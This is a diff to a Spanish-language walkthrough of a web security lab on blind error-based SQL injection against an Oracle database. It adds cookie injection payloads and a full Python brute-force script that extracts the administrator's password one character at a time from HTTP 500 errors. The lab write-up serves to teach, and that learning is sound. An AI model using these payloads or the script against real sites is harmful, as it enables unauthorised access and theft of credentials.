@@ -492,15 +492,102 @@ La base de datos contiene una tabla diferente llamada users, con columnas llamad
 
 Para resolver el laboratorio, inicie sesión como administrator usuario. 
 
+La idea es confirmar que la consulta es vulnerable a la inyección.
 
+- Verificar que existe una tabla ‘users‘ y un usuario ‘administrator‘.
+- Descubrir la longitud de la contraseña del administrador.
+- Extraer la contraseña carácter por carácter, forzando errores solo cuando la condición evaluada es verdadera.
+- Para provocar errores intencionados, se usa la función ‘TO_CHAR(1/0)‘ (división por cero en Oracle), dentro de expresiones ‘CASE WHEN‘ que evalúan condiciones booleanas. 
+- La idea es generar un error solo cuando la condición se cumple, lo que permite inferir información sin necesidad de ver los resultados directamente.
+
+Vemos que si le pasamos esta query va existir, previamente he probado el caso típico y hasta que he visto que es de Oracle
+```
 Cookie: TrackingId=cMkoRqzxe2swLOUK'||(select case when(1=1) then to_char(1/0) else '' end from users where username='administrator')||'
+```
 
+De esta manera podemos averiguar cuál es la longitud de la cadena de la contraseña porque nos devuelve un error 500 
+```
 Cookie: TrackingId=cMkoRqzxe2swLOUK'||(select case when length(password)=20 then to_char(1/0) else '' end from users where username='administrator')||' ; session=usrsh1fR18X01MOdnWj4xeKTZZyM8ia9
+```
 
-Cookie: TrackingId=cMkoRqzxe2swLOUK'||(select case when substr(username,1,1)='b' then to_char(1/0) else '' end from users where username='administrator')||' ; session=usrsh1fR18X01MOdnWj4xeKTZZyM8ia9
-
-
+De esta forma pruebo cual seria el primer carácter de la contraseña por ejemplo la `r` al igual que el anterior podemos ir iterando para 
+averiguar toda la contraseña.
+```
 Cookie: TrackingId=cMkoRqzxe2swLOUK'||(SELECT CASE WHEN substr(password,1,1)='r' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||' ; session=usrsh1fR18X01MOdnWj4xeKTZZyM8ia9
+```
+
+De la misma forma que el anterior hacemos un script para ir probando uno a uno y comprobar que sale un error 500 
+```python
+#!/usr/bin/env python3
+
+from pwn import log
+from termcolor import colored
+import requests
+import signal
+import string
+import sys
+import time
+
+# Configuración general
+TARGET_URL = "https://0a9000d90401150b80e712e400a40014.web-security-academy.net"
+TRACKING_ID_BASE = "pV6VIodNebTE2XMw"
+SESSION_COOKIE = "wUeRGHgmE6wlTdCuo8BEmGyPNTD272Vk"
+USERNAME = "administrator"
+MAX_PASSWORD_LENGTH = 20
+CHARS = string.ascii_lowercase + string.digits
+
+# Manejo de Ctrl+C
+def def_handler(sig, frame):
+    print(colored("\n[!] Ataque interrumpido por el usuario", "red"))
+    p1.failure("Proceso detenido.")
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+# Logging
+p1 = log.progress("SQL Injection")
+
+def makeSQLI():
+    p1.status("Iniciando ataque de fuerza bruta...")
+    time.sleep(1)
+
+    password = ""
+    p2 = log.progress("Contraseña descubierta")
+
+    for position in range(1, MAX_PASSWORD_LENGTH + 1):
+        for character in CHARS:
+            injection = (
+                f"{TRACKING_ID_BASE}'||"
+                f"(SELECT CASE WHEN substr(password,{position},1)='{character}' "
+                f"THEN to_char(1/0) ELSE '' END FROM users WHERE username='{USERNAME}')||'"
+            )
+
+            cookies = {
+                'TrackingId': injection,
+                'session': SESSION_COOKIE
+            }
+
+            try:
+                r = requests.get(TARGET_URL, cookies=cookies, timeout=5)
+
+                if r.status_code == 500:
+                    password += character
+                    p2.status(password)
+                    print(colored(f"[✓] Letra correcta: '{character}' → {password}", "green"))
+                    break
+
+            except requests.exceptions.RequestException as e:
+                print(colored(f"[!] Error en la petición: {e}", "red"))
+                continue
+
+    return password
+
+if __name__ == "__main__":
+    print(colored("[*] Ataque iniciado...", "cyan"))
+    final_password = makeSQLI()
+    print(colored(f"\n[✓] Contraseña encontrada: {final_password}", "green"))
+
+```
 
 ## ¿Qué es una SQLI ?
 
